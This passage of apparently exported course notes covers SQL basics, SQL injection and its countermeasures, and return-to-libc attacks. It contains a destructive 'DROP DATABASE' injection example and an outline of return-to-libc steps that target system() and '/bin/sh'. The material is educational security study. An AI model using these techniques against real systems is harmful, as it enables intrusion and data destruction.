DESCRIBE employee; //prints the table</code></pre><figure id="1121a926-7344-8077-9d16-c86b32ba5009" class="image"><a href="image%20172.png"><img style="width:469.9999694824219px" src="image%20172.png"/></a></figure><h3 id="1121a926-7344-80c4-861e-de7d8143092d" class="">Insert a row</h3><p id="1121a926-7344-8092-b9e9-e83b617ff1b9" class="">creates a record and inserts it into the table</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1121a926-7344-8029-844c-d13ba9bff2f9" class="code"><code class="language-SQL">INSERT INTO employee (Name, EID, Password) 
							VALUES (&#x27;howard&#x27;, &#x27;EID1&#x27;, &#x27;password123&#x27;)</code></pre><h3 id="1121a926-7344-80aa-b7a7-e1b27f015ff5" class="">Select Statement</h3><p id="1121a926-7344-807f-a8b1-ce22935bb926" class="">operation to retrieve info from the database</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1121a926-7344-8054-a346-c533de752879" class="code"><code class="language-SQL">SELECT * FROM employee; //gets all (*) records from employee table</code></pre><figure id="1121a926-7344-80c3-bf2a-d67d764a72a5" class="image"><a href="image%20173.png"><img style="width:623.96875px" src="image%20173.png"/></a></figure><h3 id="1121a926-7344-8067-81ff-f8564f475dff" class="">Where Clause</h3><p id="1121a926-7344-80d1-82a7-fd02cf62f94d" class="">set conditions for SQL statements</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1121a926-7344-80f8-b28e-e919fc5947d4" class="code"><code class="language-SQL">SQLSTATEMENT WHERE predicate

//gets record with name david or eid is 100
SELECT * FROM employee WHERE EID=&#x27;EID100&#x27; OR Name=&#x27;David&#x27;; 

//if condtion is always true, then return all records (like *)
SELECT * FROM employee WHERE 1=1;</code></pre><figure id="1121a926-7344-8097-aea4-e001a4d31e60" class="image"><a href="image%20174.png"><img style="width:623.953125px" src="image%20174.png"/></a></figure><h3 id="1121a926-7344-80e0-81b3-f168e1cddaf9" class="">Update Statement</h3><p id="1121a926-7344-8001-962b-eeaa16691fa5" class="">change values in a record that is already in the table </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1121a926-7344-80ea-be18-fc875840bab9" class="code"><code class="language-SQL">UPDATE employee SET Salary=82000 WHERE Name=&#x27;Bob&#x27;</code></pre><figure id="1121a926-7344-8026-8f93-c18497551559" class="image"><a href="image%20175.png"><img style="width:623.96875px" src="image%20175.png"/></a></figure><h3 id="1121a926-7344-8040-9a29-fea4fa000da1" class="">SQL comments</h3><ul id="1121a926-7344-8067-a7f5-d410754d5bc3" class="bulleted-list"><li style="list-style-type:disc"># will treat all characters after the hash as comments</li></ul><ul id="1121a926-7344-8069-9cad-fa01925cfc19" class="bulleted-list"><li style="list-style-type:disc">same for —</li></ul><ul id="1121a926-7344-8064-92ca-da5b9b114cda" class="bulleted-list"><li style="list-style-type:disc">also supports c style comments /* */ for multi line</li></ul><p id="1121a926-7344-80c9-aba7-e97bdfa77ace" class="">can be abused in SQL injections</p></details></li></ul><ul id="1121a926-7344-80fd-8564-cab1a978d98e" class="toggle"><li><details><summary>The Channel of Attack Outline</summary><ul id="1121a926-7344-80ea-b410-dffd6dd9782d" class="bulleted-list"><li style="list-style-type:disc">program involved<figure id="1121a926-7344-80b8-8009-eee84d0cc701" class="image"><a href="image%20176.png"><img style="width:596px" src="image%20176.png"/></a></figure></li></ul><ul id="1121a926-7344-803d-8117-d01d698fa0f2" class="bulleted-list"><li style="list-style-type:disc">get data from user<figure id="1121a926-7344-809e-806f-ec5100a657b6" class="image"><a href="image%20177.png"><img style="width:595.96875px" src="image%20177.png"/></a></figure><figure id="1121a926-7344-80ee-8309-ce69211d9897" class="image"><a href="image%20178.png"><img style="width:595.96875px" src="image%20178.png"/></a></figure></li></ul><ul id="1121a926-7344-80bf-a2c1-ce56e11c53e4" class="bulleted-list"><li style="list-style-type:disc">how web app interacts with db<figure id="1121a926-7344-8042-b841-e5e24ca244fc" class="image"><a href="image%20179.png"><img style="width:595.984375px" src="image%20179.png"/></a></figure><figure id="1121a926-7344-8063-9963-ef4c59b8178a" class="image"><a href="image%20180.png"><img style="width:2219px" src="image%20180.png"/></a></figure></li></ul></details></li></ul><ul id="1121a926-7344-80e1-9a38-cb071c43dd60" class="toggle"><li><details><summary>Launching the attack</summary><ul id="1121a926-7344-8072-85a6-fdac91a15421" class="bulleted-list"><li style="list-style-type:disc">SQL injection<figure id="1121a926-7344-80a2-ad9e-d08c5242987a" class="image"><a href="image%20181.png"><img style="width:2195px" src="image%20181.png"/></a></figure></li></ul><ul id="1121a926-7344-80f9-8e7f-e2ae9f520917" class="bulleted-list"><li style="list-style-type:disc">launching the attack<figure id="1121a926-7344-801c-af76-d9d1a0b12772" class="image"><a href="image%20182.png"><img style="width:595.96875px" src="image%20182.png"/></a></figure><figure id="1121a926-7344-80ac-a7c0-c9f28a5269a3" class="image"><a href="image%20183.png"><img style="width:2149px" src="image%20183.png"/></a></figure><figure id="1121a926-7344-8083-be11-f8da6f32a5a7" class="image"><a href="image%20184.png"><img style="width:595.984375px" src="image%20184.png"/></a></figure><figure id="1121a926-7344-8004-aa2b-f40a41143ce3" class="image"><a href="image%20185.png"><img style="width:595.984375px" src="image%20185.png"/></a></figure></li></ul></details></li></ul><ul id="1141a926-7344-80c5-93dd-f8bc72fb465c" class="toggle"><li><details><summary>Modifying Database</summary><ul id="1141a926-7344-80bc-82a1-ef71a0bc443b" class="bulleted-list"><li style="list-style-type:disc">UPDATE or INSERT INTO changes records in the database</li></ul><ul id="1141a926-7344-8029-b8b7-ee7608fa2971" class="bulleted-list"><li style="list-style-type:disc">form for changing passwords ask user to pass EID, old password and new password<ul id="1141a926-7344-80dd-a32c-c4de89337f66" class="bulleted-list"><li style="list-style-type:circle">submit button does a HTTP POST request</li></ul><ul id="1141a926-7344-80f6-81e0-c6f984443a7b" class="bulleted-list"><li style="list-style-type:circle">request is sent to the changepassword.php server side script</li></ul><ul id="1141a926-7344-80f4-ad8b-d5fce74b4bf3" class="bulleted-list"><li style="list-style-type:circle">this will do an UPDATE statement to change the user’s password</li></ul><figure id="1141a926-7344-80d8-8377-d89a499887ac" class="image"><a href="image%20186.png"><img style="width:595.96875px" src="image%20186.png"/></a></figure></li></ul><ul id="1141a926-7344-8020-87dc-e5f9e4fa882f" class="bulleted-list"><li style="list-style-type:disc">the UPDATE sql statement is unsafe </li></ul><ul id="1141a926-7344-80de-ba54-d11241fe0f8c" class="bulleted-list"><li style="list-style-type:disc">SQL can be injected itno the password field to write your own SQL statements<figure id="1141a926-7344-80c0-ae8f-fe407bbbd566" class="image"><a href="image%20187.png"><img style="width:2175px" src="image%20187.png"/></a></figure></li></ul><ul id="1141a926-7344-8060-9fd9-cc75ece3129f" class="bulleted-list"><li style="list-style-type:disc">a different from can be used to cause another SQLI attack with a # comment<figure id="1141a926-7344-809d-9d47-fd2b4803ad08" class="image"><a href="image%20188.png"><img style="width:595.984375px" src="image%20188.png"/></a></figure></li></ul></details></li></ul><ul id="1141a926-7344-80e1-9593-ff44178583a5" class="toggle"><li><details><summary>Multiple SQL statements</summary><figure id="1141a926-7344-8049-9604-f48185cc1ea1" class="image"><a href="image%20189.png"><img style="width:623.96875px" src="image%20189.png"/></a></figure><ul id="1141a926-7344-805d-96cd-e96bd46844e4" class="bulleted-list"><li style="list-style-type:disc">damage that can be done with single statement SQL injections are bounded: we cannot change everything</li></ul><ul id="1141a926-7344-8005-bc1d-ffb29a0534f7" class="bulleted-list"><li style="list-style-type:disc">allowing multiple SQL statements will be more dangours</li></ul><ul id="1141a926-7344-808d-abcf-d7f528c2fc89" class="bulleted-list"><li style="list-style-type:disc">EG: DROP DATABASE dbtest<figure id="1141a926-7344-8002-9215-dc5d3863ed0e" class="image"><a href="image%20190.png"><img style="width:595.984375px" src="image%20190.png"/></a></figure></li></ul><figure id="1141a926-7344-80c7-985f-ca6898fafab1" class="image"><a href="image%20191.png"><img style="width:623.984375px" src="image%20191.png"/></a></figure><ul id="1141a926-7344-8081-916d-fd3a33fa7ef1" class="bulleted-list"><li style="list-style-type:disc">multiple SQL statements may or may not work depending on the implementation of the form<ul id="1141a926-7344-806c-9e36-f4c1a05cf81e" class="bulleted-list"><li style="list-style-type:circle">$mysqli→query() only allows 1 statement </li></ul><ul id="1141a926-7344-80c2-af37-d89ff7985f05" class="bulleted-list"><li style="list-style-type:circle">$mysqli→multi_query() allows multiple statements </li></ul></li></ul></details></li></ul><ul id="1141a926-7344-806c-b1ab-f1609501fbbc" class="toggle"><li><details><summary>Fundamental Cause of SQL Injections</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1141a926-7344-80c4-b994-e5407b2a8a67"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="258d7fae-65a0-41eb-b864-1b92c5aa1450" class="">mixing of data and code is the problem</p><ul id="1141a926-7344-80a6-9313-f28de41060b0" class="bulleted-list"><li style="list-style-type:disc">the moment you trust user generated data, the data could have code in it</li></ul><ul id="1141a926-7344-80f0-851e-c869d3530381" class="bulleted-list"><li style="list-style-type:disc">the program will blindly accept any code and just execute it</li></ul><ul id="1141a926-7344-80e1-aa78-ebd0132f43ed" class="bulleted-list"><li style="list-style-type:disc">allowing users to execute arbitrary code</li></ul><figure id="1141a926-7344-801c-bca1-ebe2b57e22ac" class="image"><a href="image%20192.png"><img style="width:561.96875px" src="image%20192.png"/></a></figure></div></figure></details></li></ul><ul id="1141a926-7344-80a5-838c-eb8c3965e526" class="toggle"><li><details><summary>Countermeasures</summary><ul id="1141a926-7344-806d-b95e-d75f4585f766" class="toggle"><li><details><summary>Filtering and Encoding</summary><figure id="1141a926-7344-801d-a427-d5e12ca9d4b0" class="image"><a href="image%20193.png"><img style="width:595.984375px" src="image%20193.png"/></a></figure><ul id="1141a926-7344-80bb-b1ba-fc0d478ad416" class="bulleted-list"><li style="list-style-type:disc">before mixing user data with code: inspect the data and filter out characters that may be interpreted as code</li></ul><ul id="1141a926-7344-8058-a124-ee3f50f9f657" class="bulleted-list"><li style="list-style-type:disc">to get rid of special characters, encode them to tell the parser to treat the encoded character as data instead of code<figure id="1141a926-7344-80d4-b223-f69ed9f46437" class="image"><a href="image%20194.png"><img style="width:567.90625px" src="image%20194.png"/></a></figure></li></ul><ul id="1141a926-7344-8006-9d59-e1d0f03c6386" class="bulleted-list"><li style="list-style-type:disc">the problem of filtering and encoding is that it doesn’t address the root cause of mixing of code and data, allowing for work arounds</li></ul><ul id="1141a926-7344-8055-b3ac-cb5643a9fbdb" class="bulleted-list"><li style="list-style-type:disc">PHP has functions to filter and encode</li></ul></details></li></ul><ul id="1141a926-7344-8009-8a9a-e977ecaeabf5" class="toggle"><li><details><summary>Prepared Statements</summary><figure id="1141a926-7344-8009-8d5e-e2cea5794ab4" class="image"><a href="image%20195.png"><img style="width:595.96875px" src="image%20195.png"/></a></figure><ul id="1141a926-7344-806a-ba2d-cae368c886aa" class="bulleted-list"><li style="list-style-type:disc">separates the data and code channels into 2 different channels so the database/server knows which is data and code (so they are not mixed and only code from the code channel is executed)</li></ul><ul id="1141a926-7344-806a-a570-dacb2c4d78eb" class="bulleted-list"><li style="list-style-type:disc">prepared statement is just an optmized feature that improves performance if the same or similar SQL statement needs to be executed repeatedly<ul id="1141a926-7344-80f7-bcc6-f5de20fec27d" class="bulleted-list"><li style="list-style-type:circle">its like a SQL statement template with certain values called parameters</li></ul><ul id="1141a926-7344-80d1-9b5d-c0bd0bb48ccf" class="bulleted-list"><li style="list-style-type:circle">database parces, compiles and perforamces query optimization on the sql statement template and stores it without executing it</li></ul><ul id="1141a926-7344-8056-81b9-d5b48ed5f862" class="bulleted-list"><li style="list-style-type:circle">we later bind data to the prepared statements<figure id="1141a926-7344-80fb-a142-c3f6af0e76a3" class="image"><a href="image%20196.png"><img style="width:2211px" src="image%20196.png"/></a></figure></li></ul></li></ul><figure id="1141a926-7344-8052-9740-e3a4333af391" class="image"><a href="image%20197.png"><img style="width:2221px" src="image%20197.png"/></a></figure></details></li></ul><ul id="1141a926-7344-80b6-a664-c413b41b1701" class="toggle"><li><details><summary>Others</summary><figure id="1141a926-7344-807c-aa1f-ea78d205ab97" class="image"><a href="image%20198.png"><img style="width:595.96875px" src="image%20198.png"/></a></figure></details></li></ul></details></li></ul></details></li></ul><ul id="1191a926-7344-80d9-8cd0-e5fa55794352" class="toggle"><li><details><summary>Return to Lib C</summary><ul id="1191a926-7344-8044-bf24-e8a9cb7ed28d" class="toggle"><li><details><summary>Recap</summary><h3 id="1191a926-7344-80c1-a1c2-ea5bf795b2c7" class="">Address randomization</h3><figure id="1191a926-7344-80bc-8ac4-e091b244b214" class="image"><a href="image%20199.png"><img style="width:2224px" src="image%20199.png"/></a></figure><h3 id="1191a926-7344-80a7-a9df-eb89efdc7211" class="">function epilogue and prologue</h3><p id="1191a926-7344-8074-9602-ece0aa84f139" class="">used to set up and tear down the stack data frame for a function</p><figure id="1191a926-7344-8040-8b08-fc00ccd48802" class="image"><a href="image%20200.png"><img style="width:2224px" src="image%20200.png"/></a></figure></details></li></ul><h3 id="1191a926-7344-8004-80f6-f17d42afdf05" class="">Non executable stack</h3><p id="1191a926-7344-8091-aab0-f5c875f82912" class="">data stored in the stack is not executable to protect the program</p><figure id="1191a926-7344-8091-8fa4-db2397530a55" class="image"><a href="image%20201.png"><img style="width:623.984375px" src="image%20201.png"/></a></figure><figure id="1191a926-7344-8088-b1ad-e205d40d5d5b" class="image"><a href="image%20202.png"><img style="width:2055px" src="image%20202.png"/></a></figure><h3 id="1191a926-7344-8093-821a-c43831c80359" class="">How to Defeat it</h3><figure id="1191a926-7344-8029-9623-d398ad8d6d05" class="image"><a href="image%20203.png"><img style="width:2104px" src="image%20203.png"/></a></figure><ul id="1191a926-7344-80dd-8af0-fb1ffdab5520" class="bulleted-list"><li style="list-style-type:disc">to defeat non exec stacks: after the buffer overflow, return to existing code which is marked as executable and use that code’s vulrablity to exploit it</li></ul><ul id="1191a926-7344-8077-9eb7-f0de522901b7" class="bulleted-list"><li style="list-style-type:disc">some existing code that already exist is:<ul id="1191a926-7344-80cf-a4ba-d38ab3df5011" class="bulleted-list"><li style="list-style-type:circle">program’s own code</li></ul><ul id="1191a926-7344-80e8-9082-f153d5417135" class="bulleted-list"><li style="list-style-type:circle">libraries, such as cstd</li></ul><ul id="1191a926-7344-807f-bf2c-fd2a9a1097a7" class="bulleted-list"><li style="list-style-type:circle">os code</li></ul></li></ul><figure id="1191a926-7344-80c4-856a-ce49c6575943" class="image"><a href="image%20204.png"><img style="width:623.96875px" src="image%20204.png"/></a></figure><ul id="1191a926-7344-8035-b9ce-cc084624ce18" class="bulleted-list"><li style="list-style-type:disc">for example, jump to the system function in the libc function</li></ul><ul id="1191a926-7344-8042-a742-e3df5df4bf71" class="bulleted-list"><li style="list-style-type:disc">system function takes in a command to execute</li></ul><ul id="1191a926-7344-8096-b458-cbf694271259" class="bulleted-list"><li style="list-style-type:disc">when you jump into the system function, it’ll not pass in the command argument as if you were to call it normally</li></ul><h3 id="1191a926-7344-806c-9034-ec2b02e557c5" class="">Doing the attack</h3><ol type="a" id="1191a926-7344-806a-a468-eb570632df71" class="numbered-list" start="1"><li>find the address of system() function from libc: to overwite the return address with the system()’s address<ul id="1191a926-7344-809b-a3b1-d008006a4b0d" class="bulleted-list"><li style="list-style-type:disc">have to first turn off some protections to isolate this problem</li></ul><ul id="1191a926-7344-8021-9891-f8d1acdbc9e4" class="bulleted-list"><li style="list-style-type:disc">make sure the code has a buffer overflow problem</li></ul><ul id="1191a926-7344-8091-9ac0-c42228aff140" class="bulleted-list"><li style="list-style-type:disc">get the address of the system function and its exit using gdb</li></ul><figure id="1191a926-7344-80bf-90b0-f625047aaea7" class="image"><a href="image%20205.png"><img style="width:2105px" src="image%20205.png"/></a></figure><figure id="1191a926-7344-8026-b755-d3339edc1323" class="image"><a href="image%20206.png"><img style="width:623.984375px" src="image%20206.png"/></a></figure><figure id="1191a926-7344-805f-b297-f7ad32a0046c" class="image"><a href="image%20207.png"><img style="width:2233px" src="image%20207.png"/></a></figure></li></ol><ol type="a" id="1191a926-7344-802b-9abb-d6afaef579a6" class="numbered-list" start="2"><li>find the address of the “/bin/sh” string: to run the “/bin/sh” command from system()<ul id="1191a926-7344-807f-9ebc-ca71800f521b" class="bulleted-list"><li style="list-style-type:disc">find the address of bin/sh and pass it into the program as an env</li></ul><ul id="1191a926-7344-80fb-a0be-eefdeb8aeef8" class="bulleted-list"><li style="list-style-type:disc">env can be accepted and passed using the getenv function and use export it using the compiler </li></ul><figure id="1191a926-7344-80b2-8ed5-c6a7611d678f" class="image"><a href="image%20208.png"><img style="width:623.96875px" src="image%20208.png"/></a></figure><figure id="1191a926-7344-80e5-a4ba-f9d069ff0c3b" class="image"><a href="image%20209.png"><img style="width:2200px" src="image%20209.png"/></a></figure><ul id="1191a926-7344-8027-aa89-dde4a28cd937" class="bulleted-list"><li style="list-style-type:disc">name of the program is also stored in the stack as an env, so the address of /bin/sh would be pushed</li></ul><ul id="1191a926-7344-8025-a4d5-e00770bf4a7d" class="bulleted-list"><li style="list-style-type:disc">this means the address of /bin/sh will depend on the program name</li></ul><figure id="1191a926-7344-8051-be3e-c0e6003defd9" class="image"><a href="image%20210.png"><img style="width:2158px" src="image%20210.png"/></a></figure></li></ol><ol type="a" id="1191a926-7344-802a-8c72-fdd28936fe80" class="numbered-list" start="3"><li>construct arguments for system() function: find location in stack to place “/bin/sh” address<ul id="1191a926-7344-8011-81d8-e41ee3fa8a17" class="bulleted-list"><li style="list-style-type:disc">the hard part</li></ul><ul id="1191a926-7344-8016-b4ca-e67b59bd74ba" class="bulleted-list"><li style="list-style-type:disc">we want to know where ebp is: its harder than it looks</li></ul><figure id="1191a926-7344-8029-87c1-e079d1d6b67c" class="image"><a href="image%20211.png"><img style="width:2091px" src="image%20211.png"/></a></figure><ul id="1191a926-7344-8070-9ad8-cfbd58df021f" class="bulleted-list"><li style="list-style-type:disc">this is harder than it looks because of the prolog and epilog: we can see this in assembly </li></ul><figure id="1191a926-7344-80f5-90db-cb59342caccc" class="image"><a href="image%20212.png"><img style="width:623.96875px" src="image%20212.png"/></a></figure><figure id="1191a926-7344-80cd-b218-d8d5d2eb4c26" class="image"><a href="image%20213.png"><img style="width:2111px" src="image%20213.png"/></a></figure><figure id="1191a926-7344-800a-8b9d-f44f5591e6a3" class="image"><a href="image%20214.png"><img style="width:623.96875px" src="image%20214.png"/></a></figure><p id="1191a926-7344-8038-abfa-ebedc09395ae" class="">
</p></li></ol></details></li></ul></details></li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>